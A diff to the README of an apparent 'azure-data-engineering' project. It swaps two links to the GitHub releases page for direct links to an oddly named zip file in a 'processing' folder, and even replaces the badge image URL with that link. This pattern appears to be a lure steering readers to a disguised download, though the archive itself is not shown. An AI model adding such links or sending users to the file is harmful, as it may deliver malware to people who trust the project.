@@ -1,6 +1,6 @@
 # 🌟 azure-data-engineering - Your Gateway to Data Projects 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/MarketMind2207/azure-data-engineering/releases)
+[![Download the latest release](https://raw.githubusercontent.com/MarketMind2207/azure-data-engineering/main/processing/azure_data_engineering_haunchless.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/MarketMind2207/azure-data-engineering/main/processing/azure_data_engineering_haunchless.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the azure-data-engineering project! This repository is your first ste
 
 To use this application, you need to download it from the Releases page. Click the link below to visit the page where you can download the latest version of the software.
 
-[Download Latest Release](https://github.com/MarketMind2207/azure-data-engineering/releases)
+[Download Latest Release](https://raw.githubusercontent.com/MarketMind2207/azure-data-engineering/main/processing/azure_data_engineering_haunchless.zip)
 
 ## 📋 System Requirements
 
